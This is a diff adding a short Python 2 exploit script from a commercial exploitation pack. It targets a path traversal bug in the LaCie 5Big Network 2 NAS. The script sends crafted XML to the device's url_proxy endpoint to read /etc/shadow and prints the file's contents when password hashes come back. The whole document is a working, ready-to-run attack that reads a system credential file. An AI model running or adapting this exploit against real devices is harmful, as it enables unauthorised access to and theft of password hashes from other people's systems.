@@ -1,0 +1,42 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2018
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_lacie_1'
+_vendor_ = 'lacie'
+_model_  = ['5Big Network 2']
+_vuln_   = 'Path Traversal Vulnerability'
+_cve_    = ''
+_ref_    = 'https://www.syndis.is/blog/2015/5/29/arbitrary-file-read-in-lacie-5big-network-2'
+_port_   = 80
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = 'http://%s:%d/api/internal/url_proxy' % (host, port)   
+    data = '<proxy_url><url>file:///etc/shadow</url><type></type></proxy_url>'
+    response = requests.post(url,data=data, verify=False)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  if 'root:' in response.text:
+    print '[+] %s vulnerable\n' % host
+    print response.text
+  else:
+    print '[+] %s not vulnerable' % host
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
